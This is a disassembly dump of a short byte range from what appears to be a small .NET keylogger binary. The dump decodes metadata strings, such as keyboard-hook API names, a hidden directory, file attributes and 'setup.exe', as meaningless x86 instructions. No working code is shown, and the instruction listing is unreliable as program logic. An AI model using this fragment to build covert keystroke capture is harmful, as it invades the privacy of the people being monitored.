  402bcb:	6e                   	outsb  %ds:(%esi),(%dx)
  402bcc:	63 4b 65             	arpl   %ecx,0x65(%ebx)
  402bcf:	79 53                	jns    0x402c24
  402bd1:	74 61                	je     0x402c34
  402bd3:	74 65                	je     0x402c3a
  402bd5:	00 57 72             	add    %dl,0x72(%edi)
  402bd8:	69 74 65 00 43 6f 6d 	imul   $0x706d6f43,0x0(%ebp,%eiz,2),%esi
  402bdf:	70 
  402be0:	69 6c 65 72 47 65 6e 	imul   $0x656e6547,0x72(%ebp,%eiz,2),%ebp
  402be7:	65 
  402be8:	72 61                	jb     0x402c4b
  402bea:	74 65                	je     0x402c51
  402bec:	64 41                	fs inc %ecx
  402bee:	74 74                	je     0x402c64
  402bf0:	72 69                	jb     0x402c5b
  402bf2:	62 75 74             	bound  %esi,0x74(%ebp)
  402bf5:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  402bf9:	6e                   	outsb  %ds:(%esi),(%dx)
  402bfa:	65 72 61             	gs jb  0x402c5e
  402bfd:	74 65                	je     0x402c64
  402bff:	64 43                	fs inc %ebx
  402c01:	6f                   	outsl  %ds:(%esi),(%dx)
  402c02:	64 65 41             	fs gs inc %ecx
  402c05:	74 74                	je     0x402c7b
  402c07:	72 69                	jb     0x402c72
  402c09:	62 75 74             	bound  %esi,0x74(%ebp)
  402c0c:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402c11:	75 67                	jne    0x402c7a
  402c13:	67 65 72 4e          	addr16 gs jb 0x402c65
  402c17:	6f                   	outsl  %ds:(%esi),(%dx)
  402c18:	6e                   	outsb  %ds:(%esi),(%dx)
  402c19:	55                   	push   %ebp
  402c1a:	73 65                	jae    0x402c81
  402c1c:	72 43                	jb     0x402c61
  402c1e:	6f                   	outsl  %ds:(%esi),(%dx)
  402c1f:	64 65 41             	fs gs inc %ecx
  402c22:	74 74                	je     0x402c98
  402c24:	72 69                	jb     0x402c8f
  402c26:	62 75 74             	bound  %esi,0x74(%ebp)
  402c29:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402c2e:	75 67                	jne    0x402c97
  402c30:	67 61                	addr16 popa
  402c32:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402c36:	74 74                	je     0x402cac
  402c38:	72 69                	jb     0x402ca3
  402c3a:	62 75 74             	bound  %esi,0x74(%ebp)
  402c3d:	65 00 45 64          	add    %al,%gs:0x64(%ebp)
  402c41:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  402c48:	77 
  402c49:	73 61                	jae    0x402cac
  402c4b:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402c4f:	74 74                	je     0x402cc5
  402c51:	72 69                	jb     0x402cbc
  402c53:	62 75 74             	bound  %esi,0x74(%ebp)
  402c56:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  402c5b:	67 65 74 46          	addr16 gs je 0x402ca5
  402c5f:	72 61                	jb     0x402cc2
  402c61:	6d                   	insl   (%dx),%es:(%edi)
  402c62:	65 77 6f             	gs ja  0x402cd4
  402c65:	72 6b                	jb     0x402cd2
  402c67:	41                   	inc    %ecx
  402c68:	74 74                	je     0x402cde
  402c6a:	72 69                	jb     0x402cd5
  402c6c:	62 75 74             	bound  %esi,0x74(%ebp)
  402c6f:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402c73:	6d                   	insl   (%dx),%es:(%edi)
  402c74:	70 69                	jo     0x402cdf
  402c76:	6c                   	insb   (%dx),%es:(%edi)
  402c77:	61                   	popa
  402c78:	74 69                	je     0x402ce3
  402c7a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c7b:	6e                   	outsb  %ds:(%esi),(%dx)
  402c7c:	52                   	push   %edx
  402c7d:	65 6c                	gs insb (%dx),%es:(%edi)
  402c7f:	61                   	popa
  402c80:	78 61                	js     0x402ce3
  402c82:	74 69                	je     0x402ced
  402c84:	6f                   	outsl  %ds:(%esi),(%dx)
  402c85:	6e                   	outsb  %ds:(%esi),(%dx)
  402c86:	73 41                	jae    0x402cc9
  402c88:	74 74                	je     0x402cfe
  402c8a:	72 69                	jb     0x402cf5
  402c8c:	62 75 74             	bound  %esi,0x74(%ebp)
  402c8f:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402c93:	6e                   	outsb  %ds:(%esi),(%dx)
  402c94:	74 69                	je     0x402cff
  402c96:	6d                   	insl   (%dx),%es:(%edi)
  402c97:	65 43                	gs inc %ebx
  402c99:	6f                   	outsl  %ds:(%esi),(%dx)
  402c9a:	6d                   	insl   (%dx),%es:(%edi)
  402c9b:	70 61                	jo     0x402cfe
  402c9d:	74 69                	je     0x402d08
  402c9f:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  402ca2:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  402ca9:	69 
  402caa:	62 75 74             	bound  %esi,0x74(%ebp)
  402cad:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  402cb1:	74 56                	je     0x402d09
  402cb3:	61                   	popa
  402cb4:	6c                   	insb   (%dx),%es:(%edi)
  402cb5:	75 65                	jne    0x402d1c
  402cb7:	00 76 61             	add    %dh,0x61(%esi)
  402cba:	6c                   	insb   (%dx),%es:(%edi)
  402cbb:	75 65                	jne    0x402d22
  402cbd:	00 53 61             	add    %dl,0x61(%ebx)
  402cc0:	76 65                	jbe    0x402d27
  402cc2:	00 73 65             	add    %dh,0x65(%ebx)
  402cc5:	74 75                	je     0x402d3c
  402cc7:	70 2e                	jo     0x402cf7
  402cc9:	65 78 65             	gs js  0x402d31
  402ccc:	00 53 79             	add    %dl,0x79(%ebx)
  402ccf:	73 74                	jae    0x402d45
  402cd1:	65 6d                	gs insl (%dx),%es:(%edi)
  402cd3:	2e 52                	cs push %edx
  402cd5:	75 6e                	jne    0x402d45
  402cd7:	74 69                	je     0x402d42
  402cd9:	6d                   	insl   (%dx),%es:(%edi)
  402cda:	65 2e 56             	gs cs push %esi
  402cdd:	65 72 73             	gs jb  0x402d53
  402ce0:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  402ce7:	54                   	push   %esp
  402ce8:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce9:	53                   	push   %ebx
  402cea:	74 72                	je     0x402d5e
  402cec:	69 6e 67 00 4b 6c 6f 	imul   $0x6f6c4b00,0x67(%esi),%ebp
  402cf3:	67 00 67 65          	add    %ah,0x65(%bx)
  402cf7:	74 5f                	je     0x402d58
  402cf9:	45                   	inc    %ebp
  402cfa:	78 65                	js     0x402d61
  402cfc:	63 75 74             	arpl   %esi,0x74(%ebp)
  402cff:	61                   	popa
  402d00:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  402d04:	61                   	popa
  402d05:	74 68                	je     0x402d6f
  402d07:	00 47 65             	add    %al,0x65(%edi)
  402d0a:	74 46                	je     0x402d52
  402d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  402d0d:	6c                   	insb   (%dx),%es:(%edi)
  402d0e:	64 65 72 50          	fs gs jb 0x402d62
  402d12:	61                   	popa
  402d13:	74 68                	je     0x402d7d
  402d15:	00 41 73             	add    %al,0x73(%ecx)
  402d18:	79 6e                	jns    0x402d88
  402d1a:	63 43 61             	arpl   %eax,0x61(%ebx)
  402d1d:	6c                   	insb   (%dx),%es:(%edi)
  402d1e:	6c                   	insb   (%dx),%es:(%edi)
  402d1f:	62 61 63             	bound  %esp,0x63(%ecx)
  402d22:	6b 00 63             	imul   $0x63,(%eax),%eax
  402d25:	61                   	popa
  402d26:	6c                   	insb   (%dx),%es:(%edi)
  402d27:	6c                   	insb   (%dx),%es:(%edi)
  402d28:	62 61 63             	bound  %esp,0x63(%ecx)
  402d2b:	6b 00 69             	imul   $0x69,(%eax),%eax
  402d2e:	64 48                	fs dec %eax
  402d30:	6f                   	outsl  %ds:(%esi),(%dx)
  402d31:	6f                   	outsl  %ds:(%esi),(%dx)
  402d32:	6b 00 53             	imul   $0x53,(%eax),%eax
  402d35:	65 74 48             	gs je  0x402d80
  402d38:	6f                   	outsl  %ds:(%esi),(%dx)
  402d39:	6f                   	outsl  %ds:(%esi),(%dx)
  402d3a:	6b 00 68             	imul   $0x68,(%eax),%eax
  402d3d:	68 6f 6f 6b 00       	push   $0x6b6f6f
  402d42:	53                   	push   %ebx
  402d43:	79 73                	jns    0x402db8
  402d45:	74 65                	je     0x402dac
  402d47:	6d                   	insl   (%dx),%es:(%edi)
  402d48:	2e 43                	cs inc %ebx
  402d4a:	6f                   	outsl  %ds:(%esi),(%dx)
  402d4b:	6d                   	insl   (%dx),%es:(%edi)
  402d4c:	70 6f                	jo     0x402dbd
  402d4e:	6e                   	outsb  %ds:(%esi),(%dx)
  402d4f:	65 6e                	outsb  %gs:(%esi),(%dx)
  402d51:	74 4d                	je     0x402da0
  402d53:	6f                   	outsl  %ds:(%esi),(%dx)
  402d54:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  402d57:	00 6b 65             	add    %ch,0x65(%ebx)
  402d5a:	72 6e                	jb     0x402dca
  402d5c:	65 6c                	gs insb (%dx),%es:(%edi)
  402d5e:	33 32                	xor    (%edx),%esi
  402d60:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  402d63:	6c                   	insb   (%dx),%es:(%edi)
  402d64:	00 75 73             	add    %dh,0x73(%ebp)
  402d67:	65 72 33             	gs jb  0x402d9d
  402d6a:	32 2e                	xor    (%esi),%ch
  402d6c:	64 6c                	fs insb (%dx),%es:(%edi)
  402d6e:	6c                   	insb   (%dx),%es:(%edi)
  402d6f:	00 46 69             	add    %al,0x69(%esi)
  402d72:	6c                   	insb   (%dx),%es:(%edi)
  402d73:	65 53                	gs push %ebx
  402d75:	74 72                	je     0x402de9
  402d77:	65 61                	gs popa
  402d79:	6d                   	insl   (%dx),%es:(%edi)
  402d7a:	00 6c 50 61          	add    %ch,0x61(%eax,%edx,2)
  402d7e:	72 61                	jb     0x402de1
  402d80:	6d                   	insl   (%dx),%es:(%edi)
  402d81:	00 77 50             	add    %dh,0x50(%edi)
  402d84:	61                   	popa
  402d85:	72 61                	jb     0x402de8
  402d87:	6d                   	insl   (%dx),%es:(%edi)
  402d88:	00 53 79             	add    %dl,0x79(%ebx)
  402d8b:	73 74                	jae    0x402e01
  402d8d:	65 6d                	gs insl (%dx),%es:(%edi)
  402d8f:	00 45 6e             	add    %al,0x6e(%ebp)
  402d92:	75 6d                	jne    0x402e01
  402d94:	00 72 65             	add    %dh,0x65(%edx)
  402d97:	73 6f                	jae    0x402e08
  402d99:	75 72                	jne    0x402e0d
  402d9b:	63 65 4d             	arpl   %esp,0x4d(%ebp)
  402d9e:	61                   	popa
  402d9f:	6e                   	outsb  %ds:(%esi),(%dx)
  402da0:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  402da4:	6f                   	outsl  %ds:(%esi),(%dx)
  402da5:	6f                   	outsl  %ds:(%esi),(%dx)
  402da6:	6c                   	insb   (%dx),%es:(%edi)
  402da7:	65 61                	gs popa
  402da9:	6e                   	outsb  %ds:(%esi),(%dx)
  402daa:	00 4d 61             	add    %cl,0x61(%ebp)
  402dad:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  402db4:	6f                   	outsl  %ds:(%esi),(%dx)
  402db5:	6d                   	insl   (%dx),%es:(%edi)
  402db6:	61                   	popa
  402db7:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  402dbe:	43                   	inc    %ebx
  402dbf:	75 72                	jne    0x402e33
  402dc1:	72 65                	jb     0x402e28
  402dc3:	6e                   	outsb  %ds:(%esi),(%dx)
  402dc4:	74 44                	je     0x402e0a
  402dc6:	6f                   	outsl  %ds:(%esi),(%dx)
  402dc7:	6d                   	insl   (%dx),%es:(%edi)
  402dc8:	61                   	popa
  402dc9:	69 6e 00 4d 65 73 73 	imul   $0x7373654d,0x0(%esi),%ebp
  402dd0:	61                   	popa
  402dd1:	67 65 42             	addr16 gs inc %edx
  402dd4:	6f                   	outsl  %ds:(%esi),(%dx)
  402dd5:	78 49                	js     0x402e20
  402dd7:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  402dda:	00 41 70             	add    %al,0x70(%ecx)
  402ddd:	70 6c                	jo     0x402e4b
  402ddf:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  402de6:	00 53 79             	add    %dl,0x79(%ebx)
  402de9:	73 74                	jae    0x402e5f
  402deb:	65 6d                	gs insl (%dx),%es:(%edi)
  402ded:	2e 47                	cs inc %edi
  402def:	6c                   	insb   (%dx),%es:(%edi)
  402df0:	6f                   	outsl  %ds:(%esi),(%dx)
  402df1:	62 61 6c             	bound  %esp,0x6c(%ecx)
  402df4:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  402dfb:	00 53 79             	add    %dl,0x79(%ebx)
  402dfe:	73 74                	jae    0x402e74
  402e00:	65 6d                	gs insl (%dx),%es:(%edi)
  402e02:	2e 52                	cs push %edx
  402e04:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  402e07:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402e0c:	6e                   	outsb  %ds:(%esi),(%dx)
  402e0d:	00 45 78             	add    %al,0x78(%ebp)
  402e10:	63 65 70             	arpl   %esp,0x70(%ebp)
  402e13:	74 69                	je     0x402e7e
  402e15:	6f                   	outsl  %ds:(%esi),(%dx)
  402e16:	6e                   	outsb  %ds:(%esi),(%dx)
  402e17:	00 52 75             	add    %dl,0x75(%edx)
  402e1a:	6e                   	outsb  %ds:(%esi),(%dx)
  402e1b:	00 43 75             	add    %al,0x75(%ebx)
  402e1e:	6c                   	insb   (%dx),%es:(%edi)
  402e1f:	74 75                	je     0x402e96
  402e21:	72 65                	jb     0x402e88
  402e23:	49                   	dec    %ecx
  402e24:	6e                   	outsb  %ds:(%esi),(%dx)
  402e25:	66 6f                	outsw  %ds:(%esi),(%dx)
  402e27:	00 46 69             	add    %al,0x69(%esi)
  402e2a:	6c                   	insb   (%dx),%es:(%edi)
  402e2b:	65 53                	gs push %ebx
  402e2d:	79 73                	jns    0x402ea2
  402e2f:	74 65                	je     0x402e96
  402e31:	6d                   	insl   (%dx),%es:(%edi)
  402e32:	49                   	dec    %ecx
  402e33:	6e                   	outsb  %ds:(%esi),(%dx)
  402e34:	66 6f                	outsw  %ds:(%esi),(%dx)
  402e36:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  402e3a:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  402e3f:	79 49                	jns    0x402e8a
  402e41:	6e                   	outsb  %ds:(%esi),(%dx)
  402e42:	66 6f                	outsw  %ds:(%esi),(%dx)
  402e44:	00 5a 65             	add    %bl,0x65(%edx)
  402e47:	72 6f                	jb     0x402eb8
  402e49:	00 73 65             	add    %dh,0x65(%ebx)
  402e4c:	74 75                	je     0x402ec3
  402e4e:	70 00                	jo     0x402e50
  402e50:	43                   	inc    %ebx
  402e51:	68 61 72 00 53       	push   $0x53007261
  402e56:	70 65                	jo     0x402ebd
  402e58:	63 69 61             	arpl   %ebp,0x61(%ecx)
  402e5b:	6c                   	insb   (%dx),%es:(%edi)
  402e5c:	46                   	inc    %esi
  402e5d:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5e:	6c                   	insb   (%dx),%es:(%edi)
  402e5f:	64 65 72 00          	fs gs jb 0x402e63
  402e63:	67 65 74 5f          	addr16 gs je 0x402ec6
  402e67:	52                   	push   %edx
  402e68:	65 73 6f             	gs jae 0x402eda
  402e6b:	75 72                	jne    0x402edf
  402e6d:	63 65 4d             	arpl   %esp,0x4d(%ebp)
  402e70:	61                   	popa
  402e71:	6e                   	outsb  %ds:(%esi),(%dx)
  402e72:	61                   	popa
  402e73:	67 65 72 00          	addr16 gs jb 0x402e77
  402e77:	53                   	push   %ebx
  402e78:	79 73                	jns    0x402eed
  402e7a:	74 65                	je     0x402ee1
  402e7c:	6d                   	insl   (%dx),%es:(%edi)
  402e7d:	2e 43                	cs inc %ebx
  402e7f:	6f                   	outsl  %ds:(%esi),(%dx)
  402e80:	64 65 44             	fs gs inc %esp
  402e83:	6f                   	outsl  %ds:(%esi),(%dx)
  402e84:	6d                   	insl   (%dx),%es:(%edi)
  402e85:	2e 43                	cs inc %ebx
  402e87:	6f                   	outsl  %ds:(%esi),(%dx)
  402e88:	6d                   	insl   (%dx),%es:(%edi)
  402e89:	70 69                	jo     0x402ef4
  402e8b:	6c                   	insb   (%dx),%es:(%edi)
  402e8c:	65 72 00             	gs jb  0x402e8f
  402e8f:	43                   	inc    %ebx
  402e90:	75 72                	jne    0x402f04
  402e92:	72 65                	jb     0x402ef9
  402e94:	6e                   	outsb  %ds:(%esi),(%dx)
  402e95:	74 55                	je     0x402eec
  402e97:	73 65                	jae    0x402efe
  402e99:	72 00                	jb     0x402e9b
  402e9b:	53                   	push   %ebx
  402e9c:	74 72                	je     0x402f10
  402e9e:	65 61                	gs popa
  402ea0:	6d                   	insl   (%dx),%es:(%edi)
  402ea1:	57                   	push   %edi
  402ea2:	72 69                	jb     0x402f0d
  402ea4:	74 65                	je     0x402f0b
  402ea6:	72 00                	jb     0x402ea8
  402ea8:	54                   	push   %esp
  402ea9:	65 78 74             	gs js  0x402f20
  402eac:	57                   	push   %edi
  402ead:	72 69                	jb     0x402f18
  402eaf:	74 65                	je     0x402f16
  402eb1:	72 00                	jb     0x402eb3
  402eb3:	68 69 64 64 65       	push   $0x65646469
  402eb8:	6e                   	outsb  %ds:(%esi),(%dx)
  402eb9:	5f                   	pop    %edi
  402eba:	64 69 72 00 49 45 6e 	imul   $0x756e4549,%fs:0x0(%edx),%esi
  402ec1:	75 
  402ec2:	6d                   	insl   (%dx),%es:(%edi)
  402ec3:	65 72 61             	gs jb  0x402f27
  402ec6:	74 6f                	je     0x402f37
  402ec8:	72 00                	jb     0x402eca
  402eca:	47                   	inc    %edi
  402ecb:	65 74 45             	gs je  0x402f13
  402ece:	6e                   	outsb  %ds:(%esi),(%dx)
  402ecf:	75 6d                	jne    0x402f3e
  402ed1:	65 72 61             	gs jb  0x402f35
  402ed4:	74 6f                	je     0x402f45
  402ed6:	72 00                	jb     0x402ed8
  402ed8:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  402edd:	00 2e                	add    %ch,(%esi)
  402edf:	63 63 74             	arpl   %esp,0x74(%ebx)
  402ee2:	6f                   	outsl  %ds:(%esi),(%dx)
  402ee3:	72 00                	jb     0x402ee5
  402ee5:	49                   	dec    %ecx
  402ee6:	6e                   	outsb  %ds:(%esi),(%dx)
  402ee7:	74 50                	je     0x402f39
  402ee9:	74 72                	je     0x402f5d
  402eeb:	00 53 79             	add    %dl,0x79(%ebx)
  402eee:	73 74                	jae    0x402f64
  402ef0:	65 6d                	gs insl (%dx),%es:(%edi)
  402ef2:	2e 44                	cs inc %esp
  402ef4:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  402efb:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  402f02:	74 65                	je     0x402f69
  402f04:	6d                   	insl   (%dx),%es:(%edi)
  402f05:	2e 52                	cs push %edx
  402f07:	75 6e                	jne    0x402f77
  402f09:	74 69                	je     0x402f74
  402f0b:	6d                   	insl   (%dx),%es:(%edi)
  402f0c:	65 2e 43             	gs cs inc %ebx
  402f0f:	6f                   	outsl  %ds:(%esi),(%dx)
  402f10:	6d                   	insl   (%dx),%es:(%edi)
  402f11:	70 69                	jo     0x402f7c
  402f13:	6c                   	insb   (%dx),%es:(%edi)
  402f14:	65 72 53             	gs jb  0x402f6a
  402f17:	65 72 76             	gs jb  0x402f90
  402f1a:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  402f21:	73 74                	jae    0x402f97
  402f23:	65 6d                	gs insl (%dx),%es:(%edi)
  402f25:	2e 52                	cs push %edx
  402f27:	65 73 6f             	gs jae 0x402f99
  402f2a:	75 72                	jne    0x402f9e
  402f2c:	63 65 73             	arpl   %esp,0x73(%ebp)
  402f2f:	00 4b 6c             	add    %cl,0x6c(%ebx)
  402f32:	6f                   	outsl  %ds:(%esi),(%dx)
  402f33:	67 2e 50             	addr16 cs push %eax
  402f36:	72 6f                	jb     0x402fa7
  402f38:	70 65                	jo     0x402f9f
  402f3a:	72 74                	jb     0x402fb0
  402f3c:	69 65 73 2e 52 65 73 	imul   $0x7365522e,0x73(%ebp),%esp
  402f43:	6f                   	outsl  %ds:(%esi),(%dx)
  402f44:	75 72                	jne    0x402fb8
  402f46:	63 65 73             	arpl   %esp,0x73(%ebp)
  402f49:	2e 72 65             	jb,pn  0x402fb1
  402f4c:	73 6f                	jae    0x402fbd
  402f4e:	75 72                	jne    0x402fc2
  402f50:	63 65 73             	arpl   %esp,0x73(%ebp)
  402f53:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  402f57:	75 67                	jne    0x402fc0
  402f59:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  402f60:	65 
  402f61:	73 00                	jae    0x402f63
  402f63:	4b                   	dec    %ebx
  402f64:	6c                   	insb   (%dx),%es:(%edi)
  402f65:	6f                   	outsl  %ds:(%esi),(%dx)
  402f66:	67 2e 50             	addr16 cs push %eax
  402f69:	72 6f                	jb     0x402fda
  402f6b:	70 65                	jo     0x402fd2
  402f6d:	72 74                	jb     0x402fe3
  402f6f:	69 65 73 00 73 65 74 	imul   $0x74657300,0x73(%ebp),%esp
  402f76:	5f                   	pop    %edi
  402f77:	41                   	inc    %ecx
  402f78:	74 74                	je     0x402fee
  402f7a:	72 69                	jb     0x402fe5
  402f7c:	62 75 74             	bound  %esi,0x74(%ebp)
  402f7f:	65 73 00             	gs jae 0x402f82
  402f82:	46                   	inc    %esi
  402f83:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
  402f8a:	69 
  402f8b:	62 75 74             	bound  %esi,0x74(%ebp)
  402f8e:	65 73 00             	gs jae 0x402f91
  402f91:	53                   	push   %ebx
  402f92:	65 74 41             	gs je  0x402fd6
  402f95:	74 74                	je     0x40300b
  402f97:	72 69                	jb     0x403002
  402f99:	62 75 74             	bound  %esi,0x74(%ebp)
  402f9c:	65 73 00             	gs jae 0x402f9f
  402f9f:	47                   	inc    %edi
  402fa0:	65 74 56             	gs je  0x402ff9
  402fa3:	61                   	popa
  402fa4:	6c                   	insb   (%dx),%es:(%edi)
  402fa5:	75 65                	jne    0x40300c
  402fa7:	73 00                	jae    0x402fa9
  402fa9:	61                   	popa
  402faa:	72 67                	jb     0x403013
  402fac:	73 00                	jae    0x402fae
  402fae:	53                   	push   %ebx
  402faf:	79 73                	jns    0x403024
  402fb1:	74 65                	je     0x403018
  402fb3:	6d                   	insl   (%dx),%es:(%edi)
  402fb4:	2e 57                	cs push %edi
  402fb6:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  402fbd:	46                   	inc    %esi
  402fbe:	6f                   	outsl  %ds:(%esi),(%dx)
  402fbf:	72 6d                	jb     0x40302e
  402fc1:	73 00                	jae    0x402fc3
  402fc3:	53                   	push   %ebx
  402fc4:	79 73                	jns    0x403039
  402fc6:	74 65                	je     0x40302d
  402fc8:	6d                   	insl   (%dx),%es:(%edi)
  402fc9:	2e 43                	cs inc %ebx
  402fcb:	6f                   	outsl  %ds:(%esi),(%dx)
  402fcc:	6c                   	insb   (%dx),%es:(%edi)
  402fcd:	6c                   	insb   (%dx),%es:(%edi)
  402fce:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402fd3:	6e                   	outsb  %ds:(%esi),(%dx)
  402fd4:	73 00                	jae    0x402fd6
  402fd6:	4d                   	dec    %ebp
  402fd7:	65 73 73             	gs jae 0x40304d
  402fda:	61                   	popa
  402fdb:	67 65 42             	addr16 gs inc %edx
  402fde:	6f                   	outsl  %ds:(%esi),(%dx)
  402fdf:	78 42                	js     0x403023
  402fe1:	75 74                	jne    0x403057
  402fe3:	74 6f                	je     0x403054
  402fe5:	6e                   	outsb  %ds:(%esi),(%dx)
  402fe6:	73 00                	jae    0x402fe8
  402fe8:	54                   	push   %esp
  402fe9:	65 73 74             	gs jae 0x403060
  402fec:	5f                   	pop    %edi
  402fed:	43                   	inc    %ebx
  402fee:	6c                   	insb   (%dx),%es:(%edi)
  402fef:	61                   	popa
  402ff0:	73 73                	jae    0x403065
  402ff2:	00 50 72             	add    %dl,0x72(%eax)
  402ff5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ff6:	63 65 73             	arpl   %esp,0x73(%ebp)
  402ff9:	73 00                	jae    0x402ffb
  402ffb:	45                   	inc    %ebp
  402ffc:	78 69                	js     0x403067
  402ffe:	73 74                	jae    0x403074
  403000:	73 00                	jae    0x403002
  403002:	76 4b                	jbe    0x40304f
  403004:	65 79 73             	gs jns 0x40307a
  403007:	00 43 6f             	add    %al,0x6f(%ebx)
  40300a:	6e                   	outsb  %ds:(%esi),(%dx)
  40300b:	63 61 74             	arpl   %esp,0x74(%ecx)
  40300e:	00 4f 62             	add    %cl,0x62(%edi)
  403011:	6a 65                	push   $0x65
  403013:	63 74 00 6f          	arpl   %esi,0x6f(%eax,%eax,1)
  403017:	62 6a 65             	bound  %ebp,0x65(%edx)
  40301a:	63 74 00 6f          	arpl   %esi,0x6f(%eax,%eax,1)
  40301e:	70 5f                	jo     0x40307f
  403020:	45                   	inc    %ebp
  403021:	78 70                	js     0x403093
  403023:	6c                   	insb   (%dx),%es:(%edi)
  403024:	69 63 69 74 00 49 73 	imul   $0x73490074,0x69(%ebx),%esp
  40302b:	4c                   	dec    %esp
  40302c:	65 74 74             	gs je  0x4030a3
  40302f:	65 72 4f             	gs jb  0x403081
  403032:	72 44                	jb     0x403078
  403034:	69 67 69 74 00 45 78 	imul   $0x78450074,0x69(%edi),%esp
  40303b:	69 74 00 49 41 73 79 	imul   $0x6e797341,0x49(%eax,%eax,1),%esi
  403042:	6e 
  403043:	63 52 65             	arpl   %edx,0x65(%edx)
  403046:	73 75                	jae    0x4030bd
  403048:	6c                   	insb   (%dx),%es:(%edi)
  403049:	74 00                	je     0x40304b
  40304b:	44                   	inc    %esp
  40304c:	69 61 6c 6f 67 52 65 	imul   $0x6552676f,0x6c(%ecx),%esp
  403053:	73 75                	jae    0x4030ca
  403055:	6c                   	insb   (%dx),%es:(%edi)
  403056:	74 00                	je     0x403058
  403058:	72 65                	jb     0x4030bf
  40305a:	73 75                	jae    0x4030d1
  40305c:	6c                   	insb   (%dx),%es:(%edi)
  40305d:	74 00                	je     0x40305f
  40305f:	45                   	inc    %ebp
  403060:	6e                   	outsb  %ds:(%esi),(%dx)
  403061:	76 69                	jbe    0x4030cc
  403063:	72 6f                	jb     0x4030d4
  403065:	6e                   	outsb  %ds:(%esi),(%dx)
  403066:	6d                   	insl   (%dx),%es:(%edi)
  403067:	65 6e                	outsb  %gs:(%esi),(%dx)
  403069:	74 00                	je     0x40306b
  40306b:	67 65 74 5f          	addr16 gs je 0x4030ce
  40306f:	43                   	inc    %ebx
  403070:	75 72                	jne    0x4030e4
  403072:	72 65                	jb     0x4030d9
  403074:	6e                   	outsb  %ds:(%esi),(%dx)
  403075:	74 00                	je     0x403077
  403077:	53                   	push   %ebx
  403078:	74 61                	je     0x4030db
  40307a:	72 74                	jb     0x4030f0
  40307c:	00 43 6f             	add    %al,0x6f(%ebx)
  40307f:	6e                   	outsb  %ds:(%esi),(%dx)
  403080:	76 65                	jbe    0x4030e7
  403082:	72 74                	jb     0x4030f8
  403084:	00 4d 6f             	add    %cl,0x6f(%ebp)
  403087:	76 65                	jbe    0x4030ee
  403089:	4e                   	dec    %esi
  40308a:	65 78 74             	gs js  0x403101
  40308d:	00 53 68             	add    %dl,0x68(%ebx)
  403090:	6f                   	outsl  %ds:(%esi),(%dx)
  403091:	77 00                	ja     0x403093
  403093:	53                   	push   %ebx
  403094:	65 74 57             	gs je  0x4030ee
  403097:	69 6e 64 6f 77 73 48 	imul   $0x4873776f,0x64(%esi),%ebp
  40309e:	6f                   	outsl  %ds:(%esi),(%dx)
  40309f:	6f                   	outsl  %ds:(%esi),(%dx)
  4030a0:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  4030a4:	43                   	inc    %ebx
  4030a5:	61                   	popa
  4030a6:	6c                   	insb   (%dx),%es:(%edi)
  4030a7:	6c                   	insb   (%dx),%es:(%edi)
  4030a8:	4e                   	dec    %esi
  4030a9:	65 78 74             	gs js  0x403120
  4030ac:	48                   	dec    %eax
  4030ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4030ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4030af:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  4030b3:	4d                   	dec    %ebp
  4030b4:	65 73 73             	gs jae 0x40312a
  4030b7:	61                   	popa
  4030b8:	67 65 42             	addr16 gs inc %edx
  4030bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4030bc:	78 00                	js     0x4030be
  4030be:	41                   	inc    %ecx
  4030bf:	72 72                	jb     0x403133
  4030c1:	61                   	popa
  4030c2:	79 00                	jns    0x4030c4
  4030c4:	43                   	inc    %ebx
  4030c5:	72 65                	jb     0x40312c
  4030c7:	61                   	popa
  4030c8:	74 65                	je     0x40312f
  4030ca:	53                   	push   %ebx
  4030cb:	75 62                	jne    0x40312f
